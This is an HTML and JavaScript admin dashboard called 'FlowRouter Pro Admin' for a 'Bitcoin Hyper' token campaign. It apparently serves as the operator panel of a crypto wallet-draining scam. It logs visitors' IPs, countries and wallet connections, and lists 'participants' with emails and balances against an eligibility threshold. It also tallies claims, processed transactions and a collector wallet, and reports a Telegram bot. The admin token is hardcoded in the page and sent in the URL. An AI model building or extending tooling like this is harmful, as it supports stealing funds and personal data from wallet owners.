<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔐 FlowRouter Admin</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, -apple-system, sans-serif; }
        body { background: #0a0a0f; color: white; padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
        .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: #1a1a2e; padding: 20px; border-radius: 12px; border: 1px solid #2a2a3a; }
        .stat-value { font-size: 32px; font-weight: bold; color: #60a5fa; }
        .stat-label { color: #8f9bb5; font-size: 14px; }
        .table-container { background: #1a1a2e; border-radius: 12px; padding: 20px; margin-bottom: 30px; }
        table { width: 100%; border-collapse: collapse; }
        th { text-align: left; padding: 12px; color: #8f9bb5; border-bottom: 1px solid #2a2a3a; }
        td { padding: 12px; border-bottom: 1px solid #2a2a3a; }
        .badge { background: #2a2a3a; padding: 4px 12px; border-radius: 20px; font-size: 12px; }
        .error { background: #2a1a1a; border: 1px solid #ef4444; padding: 40px; text-align: center; border-radius: 12px; }
        .loading { text-align: center; padding: 40px; color: #8f9bb5; }
        .flag { font-size: 20px; margin-right: 8px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔐 FlowRouter Pro Admin</h1>
            <div>
                <span class="badge" id="telegramStatus">📡 TELEGRAM</span>
                <button onclick="loadDashboard()" style="margin-left: 10px; padding: 8px 16px;">🔄 Refresh</button>
            </div>
        </div>
        <div id="content">Loading...</div>
    </div>

    <script>
        const ADMIN_TOKEN = 'YourSecureTokenHere123!';
        const BACKEND_URL = 'https://bthbk.vercel.app';

        async function loadDashboard() {
            try {
                document.getElementById('content').innerHTML = '<div class="loading">Loading dashboard...</div>';
                
                const response = await fetch(`${BACKEND_URL}/api/admin/dashboard?token=${ADMIN_TOKEN}`);
                const data = await response.json();
                
                if (!data.success) throw new Error(data.error);
                
                // SAFETY: Ensure all arrays exist
                const summary = data.summary || {};
                const networks = Array.isArray(data.networks) ? data.networks : [];
                const visits = Array.isArray(data.recentVisits) ? data.recentVisits : [];
                const participants = Array.isArray(data.activeParticipants) ? data.activeParticipants : [];
                const flows = Array.isArray(data.pendingFlows) ? data.pendingFlows : [];
                const transactions = Array.isArray(data.processedTransactions) ? data.processedTransactions : [];
                const locations = Array.isArray(data.locationStats) ? data.locationStats : [];
                const hourly = Array.isArray(data.hourlyActivity) ? data.hourlyActivity : [];
                const system = data.system || {};

                // Update Telegram status
                document.getElementById('telegramStatus').innerHTML = summary.telegramStatus === '✅ Connected' ? '📡 CONNECTED' : '📡 DISABLED';
                document.getElementById('telegramStatus').style.background = summary.telegramStatus === '✅ Connected' ? '#1a3a2a' : '#3a1a1a';

                // Calculate active networks safely
                const activeNetworks = networks.filter(n => n.status && String(n.status).includes('Active')).length;

                let html = `
                    <!-- Stats -->
                    <div class="stats-grid">
                        <div class="stat-card">
                            <div class="stat-label">Visits</div>
                            <div class="stat-value">${summary.totalVisits || 0}</div>
                            <div>IPs: ${summary.uniqueIPs || 0}</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-label">Participants</div>
                            <div class="stat-value">${summary.totalParticipants || 0}</div>
                            <div>Eligible: ${summary.eligibleParticipants || 0}</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-label">Claims</div>
                            <div class="stat-value">${summary.claimedParticipants || 0}</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-label">Processed</div>
                            <div class="stat-value">$${summary.totalProcessedUSD || '0'}</div>
                        </div>
                    </div>

                    <!-- Networks -->
                    <div style="margin-bottom: 30px;">
                        <h3>🌐 Networks (${activeNetworks} Active)</h3>
                        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 10px;">
                            ${networks.map(n => `
                                <div style="background: #1a1a2e; padding: 15px; border-radius: 8px;">
                                    <strong>${n.chain || 'Unknown'}</strong><br>
                                    <small>${n.contract ? n.contract.substring(0,10)+'...' : 'Not deployed'}</small><br>
                                    <span style="color: ${n.status && n.status.includes('Active') ? '#34d399' : '#ef4444'}">●</span> ${n.status || 'Unknown'}
                                </div>
                            `).join('')}
                        </div>
                    </div>

                    <!-- Recent Visits -->
                    <div class="table-container">
                        <h3>👁️ Recent Visits (${visits.length})</h3>
                        <table>
                            <tr><th>Time</th><th>Location</th><th>IP</th><th>Type</th><th>Wallet</th></tr>
                            ${visits.length ? visits.map(v => `
                                <tr>
                                    <td>${v.timestamp ? new Date(v.timestamp).toLocaleString() : 'N/A'}</td>
                                    <td><span class="flag">${v.flag || '🌍'}</span> ${v.country || 'Unknown'}</td>
                                    <td>${v.ip || 'N/A'}</td>
                                    <td>${v.isHuman ? '👤 Human' : '🤖 Bot'}</td>
                                    <td>${v.walletConnected ? '✅' : '❌'}</td>
                                </tr>
                            `).join('') : '<tr><td colspan="5" style="text-align:center">No visits</td></tr>'}
                        </table>
                    </div>

                    <!-- Participants -->
                    <div class="table-container">
                        <h3>👥 Participants (${participants.length})</h3>
                        <table>
                            <tr><th>Wallet</th><th>Location</th><th>Email</th><th>Balance</th><th>Status</th></tr>
                            ${participants.length ? participants.map(p => `
                                <tr>
                                    <td>${p.walletAddress ? p.walletAddress.substring(0,8)+'...' : 'N/A'}</td>
                                    <td><span class="flag">${p.flag || '🌍'}</span> ${p.country || 'Unknown'}</td>
                                    <td>${p.email || 'N/A'}</td>
                                    <td>$${(p.totalValueUSD || 0).toFixed(2)}</td>
                                    <td>${p.isEligible ? '✅ Eligible' : '👋 Welcome'}</td>
                                </tr>
                            `).join('') : '<tr><td colspan="5" style="text-align:center">No participants</td></tr>'}
                        </table>
                    </div>

                    <!-- Transactions -->
                    <div class="table-container">
                        <h3>💰 Transactions (${transactions.length})</h3>
                        <table>
                            <tr><th>Time</th><th>Wallet</th><th>Chain</th><th>Tx Hash</th></tr>
                            ${transactions.length ? transactions.map(tx => `
                                <tr>
                                    <td>${tx.timestamp ? new Date(tx.timestamp).toLocaleString() : 'N/A'}</td>
                                    <td>${tx.wallet ? tx.wallet.substring(0,8)+'...' : 'N/A'}</td>
                                    <td>${tx.chain || 'N/A'}</td>
                                    <td>${tx.txHash ? tx.txHash.substring(0,8)+'...' : 'N/A'}</td>
                                </tr>
                            `).join('') : '<tr><td colspan="4" style="text-align:center">No transactions</td></tr>'}
                        </table>
                    </div>

                    <!-- System Info -->
                    <div style="background: #1a1a2e; padding: 20px; border-radius: 12px;">
                        <div style="display: grid; grid-template-columns: repeat(3,1fr); gap: 20px;">
                            <div><strong>Token:</strong> ${system.tokenName || 'Bitcoin Hyper'} (${system.tokenSymbol || 'BTH'})</div>
                            <div><strong>Threshold:</strong> $${system.valueThreshold || 1}</div>
                            <div><strong>Collector:</strong> ${system.collectorWallet ? system.collectorWallet.substring(0,10)+'...' : 'N/A'}</div>
                            <div><strong>Last Update:</strong> ${new Date(data.timestamp).toLocaleString()}</div>
                            <div><strong>Telegram Bot:</strong> ${summary.telegramBot || 'N/A'}</div>
                            <div><strong>Flow Enabled:</strong> ${system.flowEnabled ? '✅' : '❌'}</div>
                        </div>
                    </div>
                `;

                document.getElementById('content').innerHTML = html;

            } catch (error) {
                console.error('Error:', error);
                document.getElementById('content').innerHTML = `
                    <div class="error">
                        <h2>❌ Connection Error</h2>
                        <p>${error.message}</p>
                        <p style="margin-top: 20px; font-size: 12px;">Backend: ${BACKEND_URL}</p>
                        <button onclick="loadDashboard()" style="margin-top: 20px; padding: 10px 30px;">Retry</button>
                    </div>
                `;
            }
        }

        // Auto-refresh
        loadDashboard();
        setInterval(loadDashboard, 30000);
    </script>
</body>
</html>
